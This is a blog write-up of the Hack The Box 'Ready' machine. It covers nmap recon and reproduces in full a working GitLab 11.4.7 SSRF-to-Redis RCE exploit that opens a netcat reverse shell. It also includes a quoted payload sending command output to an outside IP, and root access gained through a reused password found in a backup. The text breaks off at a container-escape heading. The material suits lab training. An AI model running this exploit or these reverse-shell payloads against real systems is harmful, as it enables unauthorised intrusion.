<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Ready :: Research blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="NMAP ┌──(tom㉿kali)-[~] └─$ nmap -p 5080 -sV -A 10.10.10.220 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 14:46 BST Nmap scan report for 10.10.10.220 Host is up (0.029s latency). PORT STATE SERVICE VERSION 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \xC2\xB7 GitLab |_Requested resource was http://10." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/ready/" />




<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">

  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Ready :: Research blog">
<meta property="og:description" content="Hack The Box machine" />
<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/ready/" />
<meta property="og:site_name" content="Ready" />

  <meta property="og:image" content="https://thomas-byrne.co.uk/.">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/hackthebox">HackTheBox</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/oscp">OSCP</a></li>
              
            
              
                <li><a href="/projects">Projects</a></li>
              
            
              
                <li><a href="/research">Research</a></li>
              
            
              
                <li><a href="/showcase">Showcase</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/hackthebox">HackTheBox</a></li>
      
    
      
        <li><a href="/oscp">OSCP</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
      
        <li><a href="/research">Research</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://thomas-byrne.co.uk/hackthebox/ready/">Ready</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-09 
      </span>
    
    
    <span class="post-author">:: Tom</span>
    
  </div>

  

  
    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Ready" />
  

  

  <div class="post-content"><div>
        <h2 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ nmap -p <span style="color:#ae81ff">5080</span> -sV -A 10.10.10.220               
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-25 14:46 BST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.220
Host is up <span style="color:#f92672">(</span>0.029s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE VERSION
5080/tcp open  http    nginx
| http-robots.txt: <span style="color:#ae81ff">53</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in <span style="color:#ae81ff">\x</span>C2<span style="color:#ae81ff">\x</span>B7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.86 seconds

</code></pre></div><p>From the nmap scan it looks as though only two ports are open. SSH and 5080. 5080 seems to be a webserver running nginx. Looks like it has a GitLab running.</p>
<p>Initially we needed to register for an account which lets us straight through.</p>
<p>![[Screenshot 2021-04-25 at 14.54.23.png]]</p>
<p>I found a potential username &ldquo;dude&rdquo; when looking at the public repository.</p>
<h2 id="version-1147">Version 11.4.7<a href="#version-1147" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>If we go to &ldquo;help&rdquo; we can see the version is 11.4.7. A. quick google search shows this is vulnerable to rce via a ssrf vulnerability.</p>
<p><a href="https://github.com/ctrlsam/GitLab-11.4.7-RCE">ctrlsam/GitLab-11.4.7-RCE: POC for GitLabs Authenticated RCE in version 11.4.7 community edition (github.com)</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>

<span style="color:#75715e"># Exploit Title: GitLab 11.4.7 RCE (POC)</span>
<span style="color:#75715e"># Date: 24th December 2020</span>
<span style="color:#75715e"># Exploit Author: Sam Redmond, Tam Lai Yin</span>
<span style="color:#75715e"># Software Link: https://gitlab.com/</span>
<span style="color:#75715e"># Environment: GitLab 11.4.7, community edition</span>
<span style="color:#75715e"># CVE: CVE-2018-19571 + CVE-2018-19585</span>

<span style="color:#f92672">import</span> requests
<span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
<span style="color:#f92672">import</span> argparse
<span style="color:#f92672">import</span> random


parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;GitLab 11.4.7 RCE&#39;</span>)
parser<span style="color:#f92672">.</span>add\_argument(<span style="color:#e6db74">&#39;-u&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;GitLab Username/Email&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
parser<span style="color:#f92672">.</span>add\_argument(<span style="color:#e6db74">&#39;-p&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Gitlab Password&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
parser<span style="color:#f92672">.</span>add\_argument(<span style="color:#e6db74">&#39;-g&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Gitlab URL (without port)&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
parser<span style="color:#f92672">.</span>add\_argument(<span style="color:#e6db74">&#39;-l&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;reverse shell ip&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
parser<span style="color:#f92672">.</span>add\_argument(<span style="color:#e6db74">&#39;-P&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;reverse shell port&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse\_args()

username <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>u
password <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>p
gitlab\_url <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>g <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:5080&#34;</span>
local\_ip <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>l
local\_port <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>P

session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()

<span style="color:#75715e"># Get Authentication Token</span>
r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(gitlab\_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/users/sign\_in&#34;</span>)
soup <span style="color:#f92672">=</span> BeautifulSoup(r<span style="color:#f92672">.</span>text, features<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lxml&#34;</span>)
token <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>findAll(<span style="color:#e6db74">&#39;meta&#39;</span>)\[<span style="color:#ae81ff">16</span>\]<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;content&#34;</span>)
print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;\[+\] authenticity\_token: </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

login\_form <span style="color:#f92672">=</span> {
    <span style="color:#e6db74">&#34;authenticity\_token&#34;</span>: token,
    <span style="color:#e6db74">&#34;user\[login\]&#34;</span>: username,
    <span style="color:#e6db74">&#34;user\[password\]&#34;</span>: password,
    <span style="color:#e6db74">&#34;user\[remember\_me\]&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>
}
r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>gitlab<span style="color:#960050;background-color:#1e0010">\</span>_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/users/sign\_in&#34;</span>, data<span style="color:#f92672">=</span>login\_form)

<span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status\_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">200</span>:
    exit(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Login Failed:</span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

<span style="color:#75715e"># Create project</span>
import\_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;git%3A</span><span style="color:#e6db74">%2F%2F</span><span style="color:#e6db74">%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">test</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">.git&#34;</span>
project\_name <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;project</span><span style="color:#e6db74">{</span>random<span style="color:#f92672">.</span>randrange(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10000</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
project\_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>gitlab<span style="color:#960050;background-color:#1e0010">\</span>_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>

print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;\[+\] Creating project with random name: </span><span style="color:#e6db74">{</span>project<span style="color:#960050;background-color:#1e0010">\</span>_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

form <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">nmulti
</span><span style="color:#e6db74">    sadd resque:gitlab:queues system\_hook\_push
</span><span style="color:#e6db74">    lpush resque:gitlab:queue:system\_hook\_push &#34;{</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;class</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;GitlabShellWorker</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;args</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;:\[</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;class\_eval</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;open(</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#39;|&#34;&#34;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;nc </span><span style="color:#e6db74">{</span>local<span style="color:#960050;background-color:#1e0010">\</span>_ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>local<span style="color:#960050;background-color:#1e0010">\</span>_port<span style="color:#e6db74">}</span><span style="color:#e6db74"> -e /bin/bash&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#34;&#34; </span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#39;).read</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;\],</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;retry</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;:3,</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;queue</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;system\_hook\_push</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;jid</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;ad52abc5641173e217eb2e52</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;created\_at</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;:1608799993.1234567,</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;enqueued\_at</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#34;:1608799993.1234567}&#34;
</span><span style="color:#e6db74">    exec
</span><span style="color:#e6db74">    exec
</span><span style="color:#e6db74">    exec</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;&#34;&#34;</span>

r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>gitlab<span style="color:#960050;background-color:#1e0010">\</span>_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/projects/new&#34;</span>)
soup <span style="color:#f92672">=</span> BeautifulSoup(r<span style="color:#f92672">.</span>text, features<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lxml&#34;</span>)

namespace\_id <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(
    <span style="color:#e6db74">&#39;input&#39;</span>, {<span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;project\[namespace\_id\]&#39;</span>})<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;value&#39;</span>)

project\_token <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>findAll(<span style="color:#e6db74">&#39;meta&#39;</span>)\[<span style="color:#ae81ff">16</span>\]<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;content&#34;</span>)
project\_token <span style="color:#f92672">=</span> project\_token<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;==&#34;</span>, <span style="color:#e6db74">&#34;%3D%3D&#34;</span>)
project\_token <span style="color:#f92672">=</span> project\_token<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;%2B&#34;</span>)

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;utf8=%E2%9C%93&amp;authenticity\_token=</span><span style="color:#e6db74">{</span>project<span style="color:#960050;background-color:#1e0010">\</span>_token<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;project%5Bimport\_url%5D=</span><span style="color:#e6db74">{</span>import<span style="color:#960050;background-color:#1e0010">\</span>_url<span style="color:#e6db74">}{</span>form<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;project%5Bci\_cd\_only%5D=false&amp;project%5Bname%5D=</span><span style="color:#e6db74">{</span>project<span style="color:#960050;background-color:#1e0010">\</span>_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;project%5Bnamespace\_id%5D=</span><span style="color:#e6db74">{</span>namespace<span style="color:#960050;background-color:#1e0010">\</span>_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;project%5Bpath%5D=</span><span style="color:#e6db74">{</span>project<span style="color:#960050;background-color:#1e0010">\</span>_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;project%5Bdescription%5D=&amp;project%5Bvisibility\_level%5D=0&#34;</span>

cookies <span style="color:#f92672">=</span> {
    <span style="color:#e6db74">&#39;sidebar\_collapsed&#39;</span>: <span style="color:#e6db74">&#39;false&#39;</span>,
    <span style="color:#e6db74">&#39;event\_filter&#39;</span>: <span style="color:#e6db74">&#39;all&#39;</span>,
    <span style="color:#e6db74">&#39;hide\_auto\_devops\_implicitly\_enabled\_banner\_1&#39;</span>: <span style="color:#e6db74">&#39;false&#39;</span>,
    <span style="color:#e6db74">&#39;\_gitlab\_session&#39;</span>: session<span style="color:#f92672">.</span>cookies\[<span style="color:#e6db74">&#39;\_gitlab\_session&#39;</span>\],
}

headers <span style="color:#f92672">=</span> {
    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);&#39;</span>,
    <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8&#39;</span>,
    <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;en-US,en;q=0.5&#39;</span>,
    <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate&#39;</span>,
    <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>gitlab<span style="color:#960050;background-color:#1e0010">\</span>_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/projects&#39;</span>,
    <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
    <span style="color:#e6db74">&#39;Content-Length&#39;</span>: <span style="color:#e6db74">&#39;398&#39;</span>,
    <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;close&#39;</span>,
    <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
}

print(<span style="color:#e6db74">&#34;\[+\] Running Exploit&#34;</span>)
r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(
    gitlab\_url<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/projects&#39;</span>, data<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookies, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;The change you requested was rejected.&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
    exit(<span style="color:#e6db74">&#39;Exploit failed, check input params&#39;</span>)

print(<span style="color:#e6db74">&#39;\[+\] Exploit completed successfully!&#39;</span>)
</code></pre></div><h2 id="what-is-this-attack-doing">What is this attack doing?<a href="#what-is-this-attack-doing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>When creating a new project in gitlab you have the option to import a new project by providing a URL. It does this by using webhooks. This takes in users input and fails to properly sanitise to prevent against calls to internal structures (ssrf).</p>
<p>![[Screenshot 2021-05-18 at 15.24.37.png]]</p>
<p>We can see some information on webhooks here</p>
<p>![[Screenshot 2021-05-18 at 15.26.08.png]]</p>
<p>From some research we know webhooks are vulnerable to ssrf in the 11.4.7 release. This can be confirmed in the gitlab changelog here. (It is also plastered everywhere if you google the version number) <a href="https://about.gitlab.com/releases/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/">https://about.gitlab.com/releases/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/</a></p>
<p>![[Screenshot 2021-05-18 at 15.27.35.png]]</p>
<p>Gitlab have had issues with ssrf before in the past so they have some mitgations for this. For example, you can&rsquo;t just call localhost on 127.0.0.1. However, you can bypass this check by using an IPv6 address opposed to the traditional IPv4.</p>
<p>![[Screenshot 2021-05-18 at 15.28.48.png]]</p>
<p>We can see in the gitlab documentation, what was changed in version 11.4.8. There are two main points of interest, ssrf and crlf injection. If we take a look at the ssrf source code,we can see the developer has input &ldquo;tests&rdquo; to prevent against the ssrf. This tells us how it was possible to achieve ssrf in the first place, which we can use in our attack against the out of date vulnerable application.</p>
<p>![[Screenshot 2021-05-18 at 16.36.06.png]]</p>
<p>Therefore using an IPv6 address vs an IPv4 Should work!</p>
<p>![[Screenshot 2021-05-18 at 16.33.40.png]]
So if we try and hit localhost with an IPv6 address do we still get the error?</p>
<p>![[Screenshot 2021-05-18 at 15.31.53.png]]</p>
<p>No we don&rsquo;t! SSRF is do able.</p>
<h2 id="targeting-redis">Targeting redis<a href="#targeting-redis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>From further reseaerch i discovered the way to get code execution is to exploit the crlf (new line injection) vulnerabiltiy we saw earlier in the documentation with redis.</p>
<p>Redis is a &ldquo;in memory based data structure store, used as a database&rdquo; It uses Key: Value pairs to store data and it is used with gitlab. Redis uses a simple ascii line based protocol to recieve commands. Sounds a lot like HTTP. That means it uses http commands, like GET. If we can send a GET request to the internal redis server then we could get code execution.</p>
<p>Okay so lets try play about with redis.</p>
<p>![[Screenshot 2021-05-18 at 16.01.15.png]]</p>
<p>So we can send a GET request, but everytime we specify the &ldquo;Host&rdquo; header, the connection is dropped. This is because ssrf to redis is such a problem, they implemented a &ldquo;fix&rdquo; to drop everytime it sees the Host header.</p>
<p>If we were able to get our payload in front of the Host header then this might work.</p>
<p>We are using the http protocol at the moment, but gitlab allows us to use git. Lets see how the git protocol perfroms a request.</p>
<p>![[Screenshot 2021-05-18 at 16.06.45.png]]</p>
<p>So from that test we can see we can control the data in front of the &ldquo;Host:&rdquo; header if we use the git protocol.</p>
<h2 id="code-execution">Code execution<a href="#code-execution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Since this has happened before with gitlab i found this great. writeup that explains how we can get code execution.</p>
<p><a href="https://gitlab.com/gitlab-org/gitlab-foss/-/issues/41293">Command Injection vulnerability on system_hook_push queue through web hook (#41293) · Issues · GitLab.org / GitLab FOSS · GitLab</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
multi
 
sadd resque:gitlab:queues system<span style="color:#ae81ff">\_</span>hook<span style="color:#ae81ff">\_</span>push

lpush resque:gitlab:queue:system<span style="color:#ae81ff">\_</span>hook<span style="color:#ae81ff">\_</span>push <span style="color:#e6db74">&#34;{\\&#34;</span>class<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:\\&#34;</span>GitlabShellWorker<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;,\\&#34;</span>args<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:\[\\&#34;</span>class<span style="color:#ae81ff">\_</span>eval<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;,\\&#34;</span>open<span style="color:#f92672">(</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;|whoami | nc 192.241.233.143 80\\&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;\],\\&#34;</span>retry<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:3,\\&#34;</span>queue<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:\\&#34;</span>system<span style="color:#ae81ff">\_</span>hook<span style="color:#ae81ff">\_</span>push<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;,\\&#34;</span>jid<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:\\&#34;</span>ad52abc5641173e217eb2e52<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;,\\&#34;</span>created<span style="color:#ae81ff">\_</span>at<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:1513714403.8122594,\\&#34;</span>enqueued<span style="color:#ae81ff">\_</span>at<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:1513714403.8129568}&#34;</span>
 
exec
exec
exec
</code></pre></div><p>What it is doing is using a &ldquo;system hook push&rdquo; to initiate a &ldquo;Gitlab Shell Worker&rdquo; to eventually execute our command.</p>
<p>A system hook is just a way of posting data to redis.</p>
<p>The gitlab shell worker is a class in ruby that allows the user to specify an argument. In our instance the argument is &ldquo;class_eval&rdquo; which is passed some ruby code &ldquo;nc 192.241.233.143 80\').read&rdquo; and sent back to the attacker via netcat.</p>
<p>![[Screenshot 2021-05-18 at 16.50.25.png]]</p>
<h2 id="prvilege-escalation">Prvilege escalation<a href="#prvilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>From running linpeas we can see there are a few files it has flagged of interest. Some files are readable by root and me but not world readable&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/var/opt/gitlab/gitlab-rails/etc/secrets.yml
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Readable files belonging to root and readable by me but not world readable                                                                                                                                  
-rw-r----- <span style="color:#ae81ff">1</span> root git <span style="color:#ae81ff">601</span> Jul  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> /var/opt/gitlab/gitaly/config.toml                                                                                                                                       
-rw-r----- <span style="color:#ae81ff">1</span> root git <span style="color:#ae81ff">1064</span> Jul  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> /var/opt/gitlab/gitlab-shell/config.yml                                                                                                                                 
-rw-r----- <span style="color:#ae81ff">1</span> root git <span style="color:#ae81ff">52</span> Jul  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> /var/opt/gitlab/gitlab-workhorse/config.toml                                                                                                                              
-rw-r----- <span style="color:#ae81ff">1</span> root git <span style="color:#ae81ff">17681</span> Jul  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> /var/opt/gitlab/gitlab-rails/etc/gitlab.yml                                                                                                                            
-rw-r----- <span style="color:#ae81ff">1</span> root git <span style="color:#ae81ff">527</span> Jul  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> /var/opt/gitlab/gitlab-rails/etc/database.yml 
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Found /opt/backup/gitlab.rb
gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;smtp_password&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wW59U!ZKMbG9+*#h&#34;</span>
</code></pre></div><p>So seems like these are some pretty good places to look since they are readable by root and me but no one else. Back ups, logs and config files are ALWAYS great places to look.</p>
<p>So turns out credentail reuse is pretty bad, who knew? so the &ldquo;smtp&rdquo; password was also the root password&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:~$ su root
su root
Password: wW59U!ZKMbG9+*#h

root@gitlab:/var/opt/gitlab# id
id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</code></pre></div><h2 id="container-escape">Container Escape<a href="#container-escape" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>So now we are root we can potentially escape the container. I know this is the next step because there is no root flag in the root directory. From running linpeas earlier on i was also able to identify we are in a docker container. (See below)</p>
